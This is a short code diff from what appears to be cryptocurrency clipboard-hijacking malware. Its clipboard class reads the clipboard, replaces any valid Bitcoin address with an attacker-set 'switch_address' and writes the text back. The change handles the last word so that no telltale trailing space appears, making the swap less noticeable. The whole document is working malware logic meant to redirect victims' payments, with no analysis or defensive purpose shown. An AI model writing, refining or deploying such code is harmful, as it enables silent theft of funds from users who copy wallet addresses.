@@ -54,11 +54,19 @@ class clipboard:
         """
         sentence = content.split()
         new_sentence: str = ""
+        word_count: int = 0 
         
         for word in sentence: 
-            if bitcoin.is_valid_address(word) is True:
-                new_sentence += f"{switch_address} "
+            word_count += 1 
+            if word_count == len(sentence):
+                if bitcoin.is_valid_address(word) is True:
+                    new_sentence += f"{switch_address}"
+                else:
+                    new_sentence += f"{word}"
             else:
-                new_sentence += f"{word} "
+                if bitcoin.is_valid_address(word) is True:
+                    new_sentence += f"{switch_address} "
+                else:
+                    new_sentence += f"{word} "   
                 
         set_contents(new_sentence)
